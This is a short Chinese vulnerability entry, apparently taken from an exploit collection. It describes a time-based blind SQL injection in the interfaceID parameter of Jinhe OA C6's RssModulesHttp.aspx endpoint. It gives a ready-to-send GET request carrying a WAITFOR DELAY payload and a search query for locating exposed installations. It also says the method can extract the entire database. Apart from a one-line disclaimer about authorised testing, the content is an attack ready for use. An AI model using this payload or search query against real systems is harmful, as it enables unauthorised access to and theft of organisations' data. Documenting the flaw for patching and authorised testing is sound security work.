---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA RssModulesHttp.aspx SQL注入漏洞

## 漏洞描述

金和OA C6 `/C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/` 接口 `interfaceID` 参数存在 SQL 注入漏洞（SQL Server 延时盲注）。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=1;waitfor/**/+delay/**/+%270:0:2%27-- HTTP/1.1
```

以延时差异判断注入点，配合条件语句可盲注提取全库数据。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
